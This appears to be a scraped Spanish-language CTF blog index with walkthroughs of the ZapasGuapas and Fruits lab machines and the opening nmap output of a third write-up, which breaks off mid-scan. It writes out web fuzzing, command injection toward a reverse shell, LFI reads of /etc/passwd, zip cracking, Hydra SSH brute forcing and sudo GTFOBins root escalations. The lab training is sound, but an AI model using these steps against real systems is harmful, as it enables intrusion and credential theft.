web:\nSi vamos probando cosas en la web vemos que no tiene muchas funcionalidades, así que vamos a realizar fuzzing:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/nmap] 13:56:49 [7/7] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.231.131/FUZZ\u0026#34; -e .php,.html,.js,.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.131/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ contact.html [Status: 200, Size: 7694, Words: 2174, Lines: 158, Duration: 1ms] about.html [Status: 200, Size: 8764, Words: 2769, Lines: 178, Duration: 1ms] login.html [Status: 200, Size: 2090, Words: 531, Lines: 50, Duration: 2ms] images [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 60ms] bin [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 1ms] css [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms] index.html [Status: 200, Size: 14085, Words: 4801, Lines: 274, Duration: 169ms] lib [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 1ms] js [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 0ms] javascript [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 2ms] include [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 0ms] testimonial.html [Status: 200, Size: 8587, Words: 2719, Lines: 173, Duration: 3ms] nike.php [Status: 200, Size: 2362, Words: 607, Lines: 78, Duration: 1ms]\rVemos que hay un login.html vamos a ver como es:\nVamos a probar credenciales típicas:\nadmin / admin administrator / admin123 Pero nada funciona, vamos a ver como se tramita nuestra data por detrás con BurpSuite, para ello interceptaremos la consulta de inicio de sesión:\nShell as www-data Vamos a enviarlo al Repeater. Si nos fijamos podremos ver que esta usando el archivo run_command.php así que seguramente este usando uno de los inputs para ejecutar X acción vamos a probar con el parámetro username:\nNada, vamos a probar con el parámetro password:\nTenemos ejecución de código!! Vamos a enviarnos una reverse shell:\nShell as pronike Si leemos el /etc/passwd podremos ver 4 usuarios:\nwww-data@zapasguapas:/var/www/tienda$ cat /etc/passwd | grep bash root:x:0:0:root:/root:/bin/bash test:x:1000:1000:test,,,:/home/test:/bin/bash proadidas:x:1001:1001::/home/proadidas:/bin/bash pronike:x:1002:1002::/home/pronike:/bin/bash\rVamos a ver ambos home, en el home del usuario pronike podremos ver un archivo llamado nota.txt:\nwww-data@zapasguapas:/home$ ls pronike nota.txt\rVamos a leerlo:\nwww-data@zapasguapas:/home$ cat pronike/nota.txt Creo que proadidas esta detras del robo de mi contraseña\rVemos que el usuario comenta que proadidas le robo la contraseña, así que vamos a ir a su home para ver si las encontramos:\nwww-data@zapasguapas:/home$ ls -la proadidas total 32 drwxr-xr-x 3 proadidas proadidas 4096 Jul 17 15:52 . drwxr-xr-x 4 root root 4096 Apr 23 2024 .. lrwxrwxrwx 1 root root 9 Apr 23 2024 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 proadidas proadidas 220 Apr 23 2023 .bash_logout -rw-r--r-- 1 proadidas proadidas 3526 Apr 23 2023 .bashrc -rw------- 1 proadidas proadidas 38 Jul 17 15:52 .lesshst drwxr-xr-x 3 proadidas proadidas 4096 Apr 23 2024 .local -rw-r--r-- 1 proadidas proadidas 807 Apr 23 2023 .profile -r-------- 1 root root 33 Apr 17 2024 user.txt\rNo vemos nada interesante\u0026hellip; Buscando por directorios encontré lo siguiente en /opt/:\nwww-data@zapasguapas:/opt$ ls importante.zip\rVamos a abrir un servidor en python3 y descargarnoslo:\nwww-data@zapasguapas:/opt$ python3 -m http.server 8082\r┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ wget 192.168.231.131:8082/importante.zip Prepended http:// to \u0026#39;192.168.231.131:8082/importante.zip\u0026#39; --2025-07-17 14:09:05-- http://192.168.231.131:8082/importante.zip Connecting to 192.168.231.131:8082... connected. HTTP request sent, awaiting response... 200 OK Length: 266 [application/zip] Saving to: ‘importante.zip’ importante.zip 100%[=================================================================================================\u0026gt;] 266 --.-KB/s in 0s 2025-07-17 14:09:05 (60.8 MB/s) - ‘importante.zip’ saved [266/266]\rBien vamos a intentar descomprimirlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ unzip importante.zip Archive: importante.zip [importante.zip] password.txt password:\rNos piden credenciales, así que vamos a crackearlo. Para ello sacaremos su hash con zip2john:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ zip2john importante.zip \u0026gt; hash ver 2.0 efh 5455 efh 7875 importante.zip/password.txt PKZIP Encr: TS_chk, cmplen=76, decmplen=71, crc=9CB8F6B5 ts=4C4E cs=4c4e type=8\rAhora vamos a crackearlo con el diccionario rockyou.txt con john indicandole el formato PKZIP:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ john -w=/usr/share/wordlists/rockyou.txt hash --format=PKZIP Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status hotstuff (importante.zip/password.txt) 1g 0:00:00:00 DONE (2025-07-17 14:11) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed.\rAhora vamos a descomprimirlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ unzip importante.zip Archive: importante.zip [importante.zip] password.txt password: inflating: password.txt\rVemos el archivo password.txt vamos a ver su contenido:\nHe conseguido la contraseña de pronike. Adidas FOREVER!!!! pronike11\rBien tenemos las credenciales del usuario pronike vamos acceder por SSH:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/content] └─$ ssh pronike@192.168.231.131 pronike@192.168.231.131\u0026#39;s password: Linux zapasguapas 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Jul 17 15:45:49 2025 from 192.168.231.128 pronike@zapasguapas:~$\rBien!! Estamos como el usuario pronike\nShell as proadidas Vamos a ver si tiene permisos SUDOERS este usuario:\npronike@zapasguapas:~$ sudo -l Matching Defaults entries for pronike on zapasguapas: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User pronike may run the following commands on zapasguapas: (proadidas) NOPASSWD: /usr/bin/apt\rBien vamos a abusar de el de la siguiente manera:\nsudo -u proadidas /usr/bin/apt changelog apt !/bin/bash\rpronike@zapasguapas:~$ sudo -u proadidas /usr/bin/apt changelog apt Des:1 https://metadata.ftp-master.debian.org apt 2.6.1 Changelog [505 kB] Descargados 505 kB en 1s (564 kB/s) proadidas@zapasguapas:/home/pronike$\rBien!! Ya somos el usuario proadidas.\nShell as root Volvamos a ver si tiene permisos SUDOERS:\nproadidas@zapasguapas:/home/pronike$ sudo -l Matching Defaults entries for proadidas on zapasguapas: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User proadidas may run the following commands on zapasguapas: (proadidas) NOPASSWD: /usr/bin/apt (root) NOPASSWD: /usr/bin/aws\rVemos que puede usar el binario aws como root sin necesidad de contraseña, si lo buscamos por GTFObins nos comenta lo siguiente:\nBien vamos a abusar de el:\nproadidas@zapasguapas:/home/pronike$ sudo aws help root@zapasguapas:/home/pronike# whoami root root@zapasguapas:/home/pronike#\rroot! ;)\nReseña ","date":"2025-07-17","id":15,"permalink":"/writeups/thehackerslabs/zapasguapas/","summary":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Zapasguapas/nmap] └─$ nmap -p- --open --min-rate=5000 -n -Pn -vvv 192.168.231.131 Starting Nmap 7.","tags":[],"title":"ZapasGuapas"},{"content":"Enumeration Vamos a empezar con un buen escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.129 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 12:27 CEST Initiating ARP Ping Scan at 12:27 Scanning 192.168.231.129 [1 port] Completed ARP Ping Scan at 12:27, 0.05s elapsed (1 total hosts) Initiating SYN Stealth Scan at 12:27 Scanning 192.168.231.129 [65535 ports] Discovered open port 80/tcp on 192.168.231.129 Discovered open port 22/tcp on 192.168.231.129 Completed SYN Stealth Scan at 12:27, 0.80s elapsed (65535 total ports) Nmap scan report for 192.168.231.129 Host is up, received arp-response (0.000043s latency). Scanned at 2025-07-15 12:27:48 CEST for 1s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 MAC Address: 00:0C:29:DC:2D:B0 (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVemos el puerto 80 y 22 abiertos, vamos a enumerar su servicio y dicha versión de el:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ nmap -p22,80 -sCV 192.168.231.129 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 12:29 CEST Nmap scan report for 192.168.231.129 Host is up (0.00016s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) | ssh-hostkey: | 256 ae:dd:1a:b6:db:a7:c7:8c:f3:03:b8:05:da:e0:51:68 (ECDSA) |_ 256 68:16:a7:3a:63:0c:8b:f6:ba:a1:ff:c0:34:e8:bf:80 (ED25519) 80/tcp open http Apache httpd 2.4.57 ((Debian)) |_http-title: P\\xC3\\xA1gina de Frutas |_http-server-header: Apache/2.4.57 (Debian) MAC Address: 00:0C:29:DC:2D:B0 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 19.52 seconds\rObtenemos la siguiente información:\nPuerto Descripción 22/tcp OpenSSH 9.2p1 Debian 80/tcp Apache httpd 2.4.57 ((Debian)) Vemos que el posible sistema operativo puede ser un Debian . Vamos a ver la web:\nVemos que es un buscador de frutas, vamos a buscar algo al azar:\nVemos que el archivo buscar.php no existe, así que casi nos cuelan un rabbit hole. Vamos a hacer fuzzing:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://192.168.231.129/FUZZ\u0026#34; -e .php,.html,.js,.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.129/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ index.html [Status: 200, Size: 1811, Words: 598, Lines: 66, Duration: 1ms] .html [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 0ms] [Status: 200, Size: 1811, Words: 598, Lines: 66, Duration: 1ms] .php [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3ms] fruits.php [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 0ms]\rVemos el archivo fruits.php , vamos a ver que contiene:\nVemos que está en blanco, vamos a hacer fuzzing por parámetros:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u \u0026#34;http://192.168.231.129/fruits.php?FUZZ=value\u0026#34; -e .php,.html,.js,.txt -fw 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.129/fruits.php?FUZZ=value :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response words: 1 ________________________________________________ :: Progress: [32265/32265] :: Job [1/1] :: 83 req/sec :: Duration: [0:00:04] :: Errors: 0 ::\rVemos que no devuleve ningúno, ya que seguramente esté esperando que apuntemos algo en concreto, vamos a probar con un LFI:\nShell as bananaman ?FUZZ=/etc/passwd ┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u \u0026#34;http://192.168.231.129/fruits.php?FUZZ=/etc/passwd\u0026#34; -e .php,.html,.js,.txt -fw 1 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://192.168.231.129/fruits.php?FUZZ=/etc/passwd :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Extensions : .php .html .js .txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response words: 1 ________________________________________________ file [Status: 200, Size: 1128, Words: 6, Lines: 25, Duration: 0ms] :: Progress: [32265/32265] :: Job [1/1] :: 76 req/sec :: Duration: [0:00:04] :: Errors: 0 ::\rVemos que hay una potencial via por LFI , vamos a comprobarlo en la aplicación web:\nTenemos un LFI , vemos el usuario bananaman . Vamos a intentar hacer fuerza bruta al servicio de SSH empleando como usuario bananaman :\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ hydra -l bananaman -P /usr/share/wordlists/rockyou.txt ssh://192.168.231.129 Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-15 12:37:33 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ssh://192.168.231.129:22/ [STATUS] 243.00 tries/min, 243 tries in 00:01h, 14344160 to do in 983:50h, 12 active [22][ssh] host: 192.168.231.129 login: bananaman password: celtic 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 4 final worker threads did not complete until end. [ERROR] 4 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-15 12:38:37\rVamos a acceder como el:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ ssh bananaman@192.168.231.129 bananaman@192.168.231.129\u0026#39;s password: Linux Fruits 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Jul 15 14:23:08 2025 from 192.168.231.128 bananaman@Fruits:~$\rShell as root Teniendo las credenciales válidas del usuario bananaman , vamos a ver si tiene algún permiso en el sudoers:\nbananaman@Fruits:~$ sudo -l Matching Defaults entries for bananaman on Fruits: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User bananaman may run the following commands on Fruits: (ALL) NOPASSWD: /usr/bin/find\rPodemos usar como cualquier usuario sin necesidad de contraseña el binario find , si buscamos en GTFObins lo encontraremos:\nhttps://gtfobins.github.io/gtfobins/find/\nVamos a poner lo indicado:\nsudo find . -exec /bin/bash \\; -quit\rroot@Fruits:/home/bananaman# whoami; hostname -I root 192.168.231.129\rroot! ;)\nReseña ","date":"2025-07-15","id":16,"permalink":"/writeups/thehackerslabs/fruits/","summary":"Enumeration Vamos a empezar con un buen escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/Fruits/nmap] └─$ nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 192.168.231.129 Starting Nmap 7.","tags":[],"title":"Fruits"},{"content":"Bienvenidos al apartado de Challenges, donde subiré gran mayoria retos de Web. De plataformas como HackTheBox, HackMyVM\u0026hellip;\nPlataformas 0\n0\n3\n0\nTipos Web\n3\nPhising\n0\n","date":"2023-09-07","id":17,"permalink":"/challenges/intro/bienvenido/","summary":"Bienvenidos al apartado de Challenges, donde subiré gran mayoria retos de Web. De plataformas como HackTheBox, HackMyVM\u0026hellip;\nPlataformas 0\n0","tags":[],"title":"👋 Bienvenido"},{"content":"Bienvenidos a la sección de Writeups, donde subiré writeups de plataformas como HackTheBox.\nEstadísticas writeups 1\n0\n1\n3\n6\n1\n0\n12\n0\n0\nEasy\n10\nMedium\n2\nHard\n0\nInsane\n0\n","date":"2023-09-07","id":18,"permalink":"/writeups/intro/bienvenido/","summary":"Bienvenidos a la sección de Writeups, donde subiré writeups de plataformas como HackTheBox.\nEstadísticas writeups 1\n0\n1\n3\n6","tags":[],"title":"👋 Bienvenido"},{"content":"Enumeration Comenzaremos con un escaneo nmap:\n# Nmap 7.94SVN scan initiated Sun Aug 18 00:54:24 2024 as: nmap -p- --open -sCVS -vvv -n -Pn -oN target 10.10.10.245 Nmap scan report for 10.10.10.245 Host is up, received user-set (0.11s latency). Scanned at 2024-08-18 00:54:24 CEST for 176s Not shown: 63221 closed tcp ports (reset), 2311 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkya ynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZ bB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPP mrKMa9NPh1sjHSdS8IwiH12V0= | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI= | 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH 80/tcp open http syn-ack ttl 63 gunicorn | http-methods: |_ Supported Methods: HEAD GET OPTIONS |_http-title: Security Dashboard |_http-server-header: gunicorn | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Sat, 17 Aug 2024 22:55:27 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 17 Aug 2024 22:55:21 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Security Dashboard\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/static/images/icon/favicon.ico\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/themify-icons.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/metisMenu.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/slicknav.min.css\u0026#34;\u0026gt; | \u0026lt;!-- amchar | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sat, 17 Aug 2024 22:55:22 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, GET, OPTIONS | Content-Length: 0 | RTSPRequest: | HTTP/1.1 400 Bad Request | Connection: close | Content-Type: text/html | Content-Length: 196 | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Bad Request\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt; | Invalid HTTP Version \u0026amp;#x27;Invalid HTTP Version: \u0026amp;#x27;RTSP/1.0\u0026amp;#x27;\u0026amp;#x27; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.94SVN%I=7%D=8/18%Time=66C12A4C%P=x86_64-pc-linux-gnu%r(G SF:etRequest,2F4C,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\ SF:x20Sat,\\x2017\\x20Aug\\x202024\\x2022:55:21\\x20GMT\\r\\nConnection:\\x20close SF:\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20 SF:19386\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20class=\\\u0026#34;no-js\\\u0026#34;\\x20lang=\\\u0026#34;en\\ SF:\u0026#34;\u0026gt;\\n\\n\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\u0026lt;meta\\x20http-equiv=\\\u0026#34;x-ua-compatible\\\u0026#34;\\x20content=\\\u0026#34;ie=edge\\\u0026#34;\u0026gt;\\n\\x SF:20\\x20\\x20\\x20\u0026lt;title\u0026gt;Security\\x20Dashboard\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;me SF:ta\\x20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial-sca SF:le=1\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;shortcut\\x20icon\\\u0026#34;\\x20type=\\\u0026#34;im SF:age/png\\\u0026#34;\\x20href=\\\u0026#34;/static/images/icon/favicon\\.ico\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x SF:20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/bootstrap\\.min\\.css SF:\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/ SF:font-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\ SF:x20href=\\\u0026#34;/static/css/themify-icons\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20r SF:el=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/metisMenu\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/owl\\.carousel\\.mi SF:n\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/stati SF:c/css/slicknav\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--\\x20amchar\u0026#34;)%r(HTTPOpt SF:ions,B3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Sat, SF:\\x2017\\x20Aug\\x202024\\x2022:55:22\\x20GMT\\r\\nConnection:\\x20close\\r\\nCon SF:tent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20HEAD,\\x20GET,\\x2 SF:0OPTIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,121,\u0026#34;HTTP/1\\.1 SF:\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20t SF:ext/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\ 